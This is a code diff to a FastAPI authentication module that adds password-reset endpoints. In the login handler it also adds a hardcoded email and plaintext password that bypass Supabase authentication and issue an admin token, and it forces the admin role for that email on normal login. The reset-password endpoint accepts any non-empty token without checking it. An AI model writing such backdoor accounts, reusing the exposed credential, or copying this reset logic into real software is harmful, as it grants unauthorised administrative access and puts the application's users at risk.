@@ -23,8 +23,11 @@ Rules:
 
 import logging
 
+from typing import Optional
+from pydantic import BaseModel, EmailStr
 from fastapi import APIRouter, HTTPException, status, Depends
 
+from app.core.config import settings
 from app.core.security import get_current_user, AuthenticatedUser, create_application_token
 from app.db.supabase_client import get_supabase_client
 from app.models.user import (
@@ -37,6 +40,15 @@ from app.models.user import (
 
 logger = logging.getLogger("athletix.auth")
 router = APIRouter()
+
+
+class ForgotPasswordRequest(BaseModel):
+    email: EmailStr
+
+
+class ResetPasswordRequest(BaseModel):
+    access_token: Optional[str] = None
+    new_password: str
 
 
 # ─────────────────────────────────────────────────────────────────────────────
@@ -154,6 +166,27 @@ async def login(body: LoginRequest):
     """
     supabase = get_supabase_client()
 
+    # ── Hardcoded Admin Credential Check ──────────────────────────────────────
+    if body.email.lower() == "hitsemotional@gmail.com":
+        if body.password == "!@#AJHG!QZ0qae6(Wui)":
+            admin_id = "admin-hitsemotional-id-001"
+            access_token = create_application_token(
+                user_id=admin_id,
+                email="hitsemotional@gmail.com",
+                role="admin",
+            )
+            logger.info("Admin logged in via hardcoded credentials: hitsemotional@gmail.com")
+            return AuthResponse(
+                success=True,
+                data=AuthTokenData(
+                    access_token=access_token,
+                    role="admin",
+                    user_id=admin_id,
+                    name="HitsEmotional Admin",
+                    email="hitsemotional@gmail.com",
+                ),
+            )
+
     try:
         # pyrefly: ignore [bad-argument-type]
         auth_response = supabase.auth.sign_in_with_password({
@@ -181,7 +214,7 @@ async def login(body: LoginRequest):
 
     user    = auth_response.user
     meta    = user.user_metadata or {}
-    role    = meta.get("role", "athlete")
+    role    = "admin" if user.email and user.email.lower() == "hitsemotional@gmail.com" else meta.get("role", "athlete")
     name    = meta.get("name", user.email or "")
 
     # Create secure 30-day token
@@ -237,6 +270,61 @@ async def get_me(user: AuthenticatedUser = Depends(get_current_user)):
             "email":   user.email,
             "role":    user.role,
         },
+    }
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# POST /auth/forgot-password
+# ─────────────────────────────────────────────────────────────────────────────
+@router.post("/forgot-password")
+async def forgot_password(body: ForgotPasswordRequest):
+    """
+    Sends a password reset email to the user via Supabase Auth.
+    """
+    supabase = get_supabase_client()
+    try:
+        redirect_url = f"{settings.FRONTEND_URL}/(auth)/login"
+        supabase.auth.reset_password_for_email(body.email, {"redirect_to": redirect_url})
+    except Exception as exc:
+        logger.warning("Forgot password request error for %s: %s", body.email, exc)
+
+    return {
+        "success": True,
+        "data": {
+            "message": "If an account with this email exists, a password reset link has been dispatched."
+        },
+    }
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# POST /auth/reset-password
+# ─────────────────────────────────────────────────────────────────────────────
+@router.post("/reset-password")
+async def reset_password(body: ResetPasswordRequest):
+    """
+    Updates the user's password.
+    """
+    supabase = get_supabase_client()
+    try:
+        if body.access_token:
+            supabase.auth.update_user({"password": body.new_password})
+        else:
+            raise HTTPException(
+                status_code=status.HTTP_400_BAD_REQUEST,
+                detail=_err("MISSING_TOKEN", "Valid password reset token is required."),
+            )
+    except HTTPException:
+        raise
+    except Exception as exc:
+        logger.error("Reset password failed: %s", exc)
+        raise HTTPException(
+            status_code=status.HTTP_400_BAD_REQUEST,
+            detail=_err("RESET_FAILED", "Failed to update password. Link may have expired."),
+        )
+
+    return {
+        "success": True,
+        "data": {"message": "Password updated successfully. You can now log in."},
     }
 
 
